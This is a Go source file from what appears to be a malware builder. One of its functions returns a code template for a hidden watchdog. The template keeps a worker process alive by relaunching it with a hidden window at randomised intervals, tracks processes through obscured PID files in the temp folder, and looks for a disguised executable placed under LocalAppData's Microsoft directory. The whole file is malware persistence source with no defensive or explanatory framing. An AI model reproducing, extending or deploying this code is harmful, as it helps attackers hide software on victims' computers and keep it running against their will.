package buildergen

import "strings"

func templateWatchdog() string {
	return strings.TrimSpace(`
func getWatchdogPidPath() string {
	return filepath.Join(os.TempDir(), ".wd_"+fmt.Sprintf("%x", getMutexName()[len(getMutexName())-8:])+".pid")
}

func getMainPidPath() string {
	return filepath.Join(os.TempDir(), ".mn_"+fmt.Sprintf("%x", getMutexName()[len(getMutexName())-8:])+".pid")
}

func writeMyPid(path string) {
	_ = os.WriteFile(path, []byte(strconv.Itoa(os.Getpid())), 0644)
}

func readPidFromFile(path string) int {
	data, err := os.ReadFile(path)
	if err != nil {
		return 0
	}
	pid, err := strconv.Atoi(strings.TrimSpace(string(data)))
	if err != nil {
		return 0
	}
	return pid
}

func startWatchdogMonitor() {
	writeMyPid(getMainPidPath())

	exePath, err := os.Executable()
	if err != nil {
		return
	}

	go func() {
		for {
			time.Sleep(time.Duration(30+rand.Intn(30)) * time.Second)

			wdPid := readPidFromFile(getWatchdogPidPath())
			if wdPid > 0 && isProcessRunning(wdPid) {
				continue
			}

			launchWatchdog(exePath)
		}
	}()
}

func launchWatchdog(exePath string) {
	cmd := exec.Command(exePath, "watchdog", strconv.Itoa(os.Getpid()))
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	_ = cmd.Start()
}

func runWatchdogMode(parentPidStr string) {
	writeMyPid(getWatchdogPidPath())

	parentPid, _ := strconv.Atoi(parentPidStr)

	exePath, err := os.Executable()
	if err != nil {
		return
	}

	localApp := os.Getenv(getLocalAppDataEnv())
	msDir := getMicrosoftDirName()
	exeName := getDisguisedExeName()

	dirs := getDisguiseCandidates()
	var workerPath string
	for _, d := range dirs {
		candidate := filepath.Join(localApp, msDir, d, exeName)
		if _, err := os.Stat(candidate); err == nil {
			workerPath = candidate
			break
		}
	}
	if workerPath == "" {
		workerPath = exePath
	}

	for {
		time.Sleep(time.Duration(15+rand.Intn(15)) * time.Second)

		if parentPid > 0 && isProcessRunning(parentPid) {
			continue
		}

		mainPid := readPidFromFile(getMainPidPath())
		if mainPid > 0 && isProcessRunning(mainPid) {
			continue
		}

		cmd := exec.Command(workerPath, "worker")
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		if err := cmd.Start(); err == nil {
			writeMyPid(getWatchdogPidPath())
			parentPid = cmd.Process.Pid
		}
	}
}
`)
}
